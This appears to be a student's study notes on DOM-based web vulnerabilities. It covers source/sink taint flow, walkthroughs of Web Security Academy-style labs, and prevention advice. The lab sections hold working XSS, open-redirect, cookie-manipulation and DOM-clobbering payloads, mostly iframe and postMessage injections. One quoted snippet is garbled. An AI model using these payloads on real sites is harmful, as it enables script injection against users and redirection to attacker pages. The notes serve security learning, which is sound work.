# DOM-based vulnerabilities

**what is DOM** 
- The DOM is a browser representation of page elements, and JavaScript can securely or insecurely manipulate it.


**What id DOM-XSS**
- DOM-based XSS (Cross-Site Scripting) happens when JavaScript in a web page takes untrusted (attacker-controlled) data from a source (like location.hash or document.cookie) and passes it directly into a sink (like innerHTML or eval()) without sanitizing it.

**What is Taint Flow?**
- Taint flow is the path that untrusted (tainted) data takes from a source to a sink.

    - Source → Where attacker-controlled input enters the JavaScript environment.
    - Sink → A function or property that can execute code, modify the DOM, or change behavior in a dangerous way.

***Why it matters:***
- If tainted data travels from a source to a sink without being validated or escaped, it can cause security issues like:

    - DOM XSS
    - Open redirection
    - Cookie theft
    - Client-side SQL injection
    - WebSocket poisoning

| **Source** (Attacker-controlled input)                           | **Sink** (Dangerous function/property)       | **Possible Vulnerability**            |
|------------------------------------------------------------------|----------------------------------------------|----------------------------------------|
| `document.URL` / `document.documentURI` / `document.URLUnencoded`| `document.write()` / `innerHTML` / `outerHTML`| DOM XSS                                |
| `document.baseURI`                                               | `element.src` / `element.href`               | Link manipulation / Open redirect      |
| `location` (`location.search`, `location.hash`, `location.href`) | `window.location`                            | Open redirect                          |
| `document.cookie`                                                | `document.cookie`                            | Cookie manipulation                    |
| `document.referrer`                                              | `innerHTML` / `outerHTML`                     | DOM XSS                                |
| `window.name`                                                    | `eval()` / `setTimeout()` / `Function()`      | JavaScript injection                   |
| `history.pushState` / `history.replaceState`                     | `window.location` / `element.href`            | Open redirect / Link manipulation      |
| `localStorage` / `sessionStorage`                                | `innerHTML` / `outerHTML` / `eval()`           | DOM XSS / JavaScript injection         |
| `IndexedDB` (`mozIndexedDB`, `webkitIndexedDB`, `msIndexedDB`)   | `innerHTML`                                   | DOM XSS                                |
| Reflected data (from URL params, etc.)                           | `JSON.parse()`                                | Client-side JSON injection             |
| Stored data (from DB/local storage)                              | `document.evaluate()`                         | Client-side XPath injection            |
| Web messages (`postMessage`)                                     | `postMessage()`                               | Web message manipulation               |
| Any string input                                                 | `RegExp()`                                    | ReDoS (Regex Denial of Service)        |
| File input / File API                                            | `FileReader.readAsText()`                     | Local file-path manipulation           |
| User input                                                       | `ExecuteSql()`                                | Client-side SQL injection              |


## Lab: DOM XSS using web messages


The code:

```
window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;
                            })

```

### What’s happening:

- The page listens for messages sent to it via postMessage or other frames/windows.

- Whatever e.data contains is directly inserted into the DOM via innerHTML without sanitization.

- If an attacker can send a crafted message to the page, they can inject arbitrary HTML/JS.

### Why it’s vulnerable
```
- innerHTML interprets input as HTML, so <script> or event handlers (like onerror) will execute.

- The developer has not validated origin (i.e., e.origin) or sanitized e.data.
```

### Attack Steps
- Identify the vulnerable listener:

  - Look for window.addEventListener('message', ...) in JS.

  - Check if the callback uses innerHTML or document.write with untrusted data.

- Verify there’s no origin check:
   ```
   if (e.origin !== "https://trusted-site.com") return;
   If missing → vulnerable.
   ```
- Craft a malicious message to exploit:
	```
	window.postMessage('<img src=x onerror=alert(1)>', '*');
    '*' sends to any origin.
    The payload uses an event handler (onerror) to trigger JavaScript.
  
    ```


### Real-World Exploit
- If you can open the target page in an iframe or another tab, you can inject:

```

<iframe src="https://victim.com"></iframe>
<script>
    // Wait until iframe loads, then send payload
    window.frames[0].postMessage('<img src=x onerror=alert(document.domain)>', '*');
</script>
```

```
<iframe src="https://vitim.com/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```


### Fix
- Validate origin:
```
if (e.origin !== "https://trusted-site.com") return;
```
- Sanitize data (e.g., DOMPurify) before inserting into the DOM:
```
document.getElementById('ads').innerHTML = DOMPurify.sanitize(e.data);
```

- Avoid using innerHTML unless necessary — use textContent for plain text.

<hr>

## Lab: DOM XSS using web messages and a JavaScript URL


Analysis :
 - Find : addEventListener
 - window.postMessage("javascript:alert(1);//https://abc.com","*")
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//https:bing.com','*')">
```


## Lab: DOM XSS using web messages and JSON.parse

Analysis : The SCRIPT
  - Find : addEventListener
```
//Testing Payload 
window.postMessage(
    JSON.stringify({
        type: "load-channel",
        url: "javascript:alert(document.domain)"
    }),
    "*"
);
```

```
<iframe src=https://0acd00030425513d807c034e00090016.web-security-academy.net/ onload='this.contentWindow.postMessage(`{"type":"load-channel","url":"javascript:print()"}`,"*")'>


<iframe src=https://vul.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

## Lab: DOM-based open redirection

Analysis :
```
<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
```

  - The url parameter contains an open redirection vulnerability that allows you to change where the "Back to Blog"

payload : 

```
https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
```

<hr>

## Lab: DOM-based cookie manipulation

Analysis :  &'><script>alert(1)</script>
payload : 

```
<iframe src="https://target.web.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://target.web.net';window.x=1;">
```
<hr>

## Lab: Exploiting DOM clobbering to enable XSS

```
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```


## Lab: Clobbering DOM attributes to bypass HTML filters


Ananlysis :  

```
Paste this in comment postId=3:  

<form id=x tabindex=0 onfocus=print()><input id=attributes>

Payload : 

       <iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">

```


## How to prevent DOM-Based Vulnerabilities:

- Avoid using untrusted data directly in dangerous DOM sinks (e.g., innerHTML, eval, document.write, event handler attributes, location, etc.).

- Validate input with a whitelist – only allow known safe values or patterns.

- Sanitize or encode output based on the context:

    - HTML encoding for HTML contexts.

    - JavaScript encoding for script contexts.

    - CSS encoding for style contexts.

    - URL encoding for links or parameters.

- Use well-tested security libraries (e.g., DOMPurify, OWASP Java Encoder) instead of writing your own sanitizer/encoder.

- Protocol restrictions – block dangerous URI schemes (javascript:, data:, cid:) in URLs from untrusted sources.

- Implement defense-in-depth – combine validation, sanitization, Content Security Policy (CSP), and strict type checks.

- Never trust DOM-created globals – avoid patterns like window.varName || fallback without validation to prevent DOM clobbering.


<hr>

## That packs in:

- Validate → Whitelist input

- Sanitize → Clean dangerous parts

- Encode → Context-specific output encoding

- Never Trust → Any untrusted DOM/URL data

- Always Restrict → Protocols, globals, sinks

- Layer Defenses → CSP, type checks, libraries

